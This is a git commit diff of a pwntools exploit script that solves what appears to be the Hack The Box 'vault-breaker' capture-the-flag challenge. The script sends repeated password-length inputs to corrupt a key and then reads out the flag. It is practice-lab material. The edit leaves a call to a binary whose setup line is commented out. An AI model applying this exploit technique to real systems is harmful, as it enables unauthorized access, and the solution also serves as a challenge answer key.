65300f5285cf529fb2b962fb69dac501aa33edb1
Birdo <81320346+Birdo1221@users.noreply.github.com>
2024-07-13 00:53:35 +0100

    Update Vault breaker.py

--- Vault breaker.py
+++ Vault breaker.py
@@ -2,34 +2,32 @@
 
 from pwn import context, log, remote, sys
 
-context.binary = 'vault-breaker'
+# Remove or comment out this line if you don't have the binary
+# context.binary = 'vault-breaker'
 
-def connect_to_server():
+def get_process():
     if len(sys.argv) == 1:
-        return context.binary.process()
+        return context.binary.process()  # Remove if not using the binary
 
     host, port = sys.argv[1].split(':')
     return remote(host, int(port))
 
-def exploit():
-    p = connect_to_server()
+def main():
+    p = get_process()
     p.sendlineafter(b'> ', b'1')
     p.sendlineafter(b'[*] Length of new password (0-31): ', b'0')
-    progress = log.progress('Length')
+    progress = log.progress('Number')
 
-    # Exploit the vulnerability by sending decreasing lengths to new_key_gen
-    for length in range(23, -1, -1):  # Start with length 23 down to 0
-        progress.status(str(length))
+    for i in range(0x17, -1, -1):
+        progress.status(str(i))
         p.sendlineafter(b'> ', b'1')
-        p.sendlineafter(b'[*] Length of new password (0-31): ', str(length).encode())
+        p.sendlineafter(b'[*] Length of new password (0-31): ', str(i).encode())
 
-    # Choose option 2 to trigger secure_password and retrieve the flag
     p.sendlineafter(b'> ', b'2')
-    p.recvuntil(b'HTB')
+    p.recvuntil(b'Master password for Vault: ', timeout=10)
     flag = b'HTB' + p.recvline().strip()
-    p.recv()
     p.close()
     print(flag.decode())
 
 if __name__ == '__main__':
-    exploit()
+    main()
